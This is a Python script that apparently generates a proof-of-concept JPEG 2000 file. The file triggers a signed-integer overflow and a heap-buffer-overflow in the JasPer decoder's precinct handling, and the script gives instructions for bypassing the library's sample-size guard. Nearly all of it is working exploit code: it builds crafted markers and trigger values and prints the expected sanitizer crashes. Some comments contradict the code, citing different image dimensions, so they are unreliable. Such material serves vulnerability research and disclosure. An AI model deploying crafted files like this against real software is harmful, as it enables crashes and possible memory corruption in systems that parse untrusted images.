#!/usr/bin/env python3
"""
vuln_001_gen.py - PoC generator for JasPer jpc_t2cod.c signed-integer-overflow (VULN 001)

Root cause: jpc_dec.c:777
    rlvl->numprcs = rlvl->numhprcs * rlvl->numvprcs;

With prcwidthexpn=prcheightexpn=0 and tile dimensions 46342 x 46341:
  numhprcs = ceil(46342 / 2^0) = 46342
  numvprcs = ceil(46341 / 2^0) = 46341
  numprcs  = 46342 * 46341 = 2,147,534,622  (overflows signed int32, INT_MAX=2,147,483,647)

prclyrnos is then allocated with only (wrapped) slots.
When the RPCL iterator runs, prcno = prcvind * numhprcs + prchind overflows the allocation.

Expected UBSAN report: "signed integer overflow: 46342 * 46341 cannot be represented in type 'int'"
Expected ASAN report: heap-buffer-overflow in jpc_pi_nextrpcl/nextpcrl/nextcprl

Progression order: RPCL (value=2) as required by the vulnerability.
Precinct size: 0 decomp levels, Scod=0x01 (custom precinct), prcsize[0]=0x00.

NOTE: The JasPer max_samples guard (64M) must be bypassed via --max-samples 0 when
running imginfo, since 46342*46341 > 64M. The system must have enough RAM for the
~17 GB component data buffer (46342*46341*8 bytes).
"""

import struct
import os

OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "vuln_001.jp2")

# Trigger values: numhprcs=46342, numvprcs=46341
# Product = 46342 * 46341 = 2,147,534,622 > INT_MAX=2,147,483,647 -> signed int32 overflow
IMG_WIDTH  = 46342
IMG_HEIGHT = 46341


def build_box(type_bytes, payload):
    """Build a JP2 box: 4-byte length + 4-byte type + payload."""
    length = 8 + len(payload)
    return struct.pack(">I", length) + type_bytes + payload


def build_jp2():
    # --- JP2 Signature box ---
    sig_box = build_box(b"jP  ", b"\x0D\x0A\x87\x0A")

    # --- File Type box ---
    ftyp_payload = b"jp2 " + struct.pack(">I", 0) + b"jp2 "
    ftyp_box = build_box(b"ftyp", ftyp_payload)

    # --- JP2 Header superbox ---
    # ihdr: HEIGHT=858993460, WIDTH=5, ncomp=1, bpc=7, c=7, unkC=0, ipr=0
    # Use IIHHBBBB format (matching existing JasPer PoC convention)
    ihdr_payload = struct.pack(">IIHHBBBB",
                               IMG_HEIGHT,  # HEIGHT
                               IMG_WIDTH,   # WIDTH
                               1,           # NC (number of components)
                               7,           # BPC (8-bit: bpc-1=7)
                               7,           # C (compression type 7=wavelet)
                               0,           # UnkC
                               0,           # IPR
                               0)           # padding
    ihdr_box = build_box(b"ihdr", ihdr_payload)

    # colr: METH=1 (enumerated), PREC=0, APPROX=0, EnumCS=17 (greyscale)
    colr_payload = struct.pack(">BBBI", 1, 0, 0, 17)
    colr_box = build_box(b"colr", colr_payload)

    jp2h_box = build_box(b"jp2h", ihdr_box + colr_box)

    # --- Contiguous Codestream box ---
    codestream = build_codestream()
    cs_box = build_box(b"jp2c", codestream)

    return sig_box + ftyp_box + jp2h_box + cs_box


def build_codestream():
    soc = b"\xFF\x4F"  # SOC: Start Of Codestream

    # SIZ marker: image and tile size
    # Tile = entire image (5 x 858993460)
    siz_payload = struct.pack(">H", 0)                              # Rsiz=0 (HL profile)
    siz_payload += struct.pack(">II", IMG_WIDTH, IMG_HEIGHT)        # Xsiz, Ysiz
    siz_payload += struct.pack(">II", 0, 0)                         # XOsiz, YOsiz (origin)
    siz_payload += struct.pack(">II", IMG_WIDTH, IMG_HEIGHT)        # XTsiz, YTsiz (tile size)
    siz_payload += struct.pack(">II", 0, 0)                         # XTOsiz, YTOsiz
    siz_payload += struct.pack(">H", 1)                             # Csiz=1 (one component)
    siz_payload += struct.pack(">BBB", 7, 1, 1)                    # Ssiz=7 (8-bit), XRsiz=1, YRsiz=1
    siz_marker = b"\xFF\x51" + struct.pack(">H", 2 + len(siz_payload)) + siz_payload

    # COD marker - critical parameters:
    #   Scod=0x01: bit0=1 sets PRT flag, enabling per-precinct size bytes
    #   SGcod: progression=2 (RPCL), 1 layer, no MCT
    #   SPcod: numdlvls=0 (1 resolution level total), xcb=4, ycb=4, mode=0, wavelet=1 (5/3 rev)
    #   prcsize[0]=0x00: PPy=0, PPx=0 => prcheightexpn=0, prcwidthexpn=0  <- TRIGGER
    cod_scod   = struct.pack(">B", 0x01)          # Scod: PRT flag set
    cod_sgcod  = struct.pack(">BHB", 0x02, 1, 0)  # RPCL, 1 layer, MCT=0
    cod_spcod  = struct.pack(">BBBBB", 0x00, 0x04, 0x04, 0x00, 0x01)  # numdlvls=0,xcb=4,ycb=4,mode=0,5/3
    prc_sizes  = bytes([0x00])                    # 1 precinct byte (numdlvls+1=1): expn=0,0
    cod_payload = cod_scod + cod_sgcod + cod_spcod + prc_sizes
    cod_marker = b"\xFF\x52" + struct.pack(">H", 2 + len(cod_payload)) + cod_payload

    # QCD marker: quantization default
    # numdlvls=0 => 1 subband (LL only), scalar reversible (Sqcd=0x40)
    # 1 stepsize byte: exponent=9 encoded as 9<<3=0x48
    qcd_payload = bytes([0x40, 0x48])
    qcd_marker = b"\xFF\x5C" + struct.pack(">H", 2 + len(qcd_payload)) + qcd_payload

    # SOT marker: start of tile 0
    # Psot=14: SOT(12 bytes) + SOD(2 bytes), TNsot=1 (single tile-part)
    sot_payload = struct.pack(">H", 0)   # Isot=0
    sot_payload += struct.pack(">I", 14) # Psot=14
    sot_payload += struct.pack(">BB", 0, 1)  # TPsot=0, TNsot=1
    sot_marker = b"\xFF\x90" + struct.pack(">H", 2 + len(sot_payload)) + sot_payload

    sod_marker = b"\xFF\x93"  # SOD: Start Of Data (tile body starts here)
    eoc        = b"\xFF\xD9"  # EOC: End Of Codestream

    return soc + siz_marker + cod_marker + qcd_marker + sot_marker + sod_marker + eoc


if __name__ == "__main__":
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    jp2_data = build_jp2()
    with open(OUTPUT_FILE, "wb") as f:
        f.write(jp2_data)
    product = IMG_WIDTH * IMG_HEIGHT
    overflow = product - (1 << 32) if product >= (1 << 31) else product
    print(f"[+] Written {len(jp2_data)} bytes to {OUTPUT_FILE}")
    print(f"[+] numhprcs={IMG_WIDTH}, numvprcs={IMG_HEIGHT}")
    print(f"[+] Product={product} (INT_MAX={2**31-1}), overflow={product > 2**31-1}")
    print(f"[+] int32 wraps to: {overflow}")
    print(f"[+] Expecting UBSAN: signed integer overflow at jpc_dec.c:777")
    print(f"[+] Expecting ASAN: heap-buffer-overflow at jpc_t2cod.c:308/411/505")
    print(f"[+] NOTE: run imginfo with --max-samples 0 to bypass the 64M sample guard")
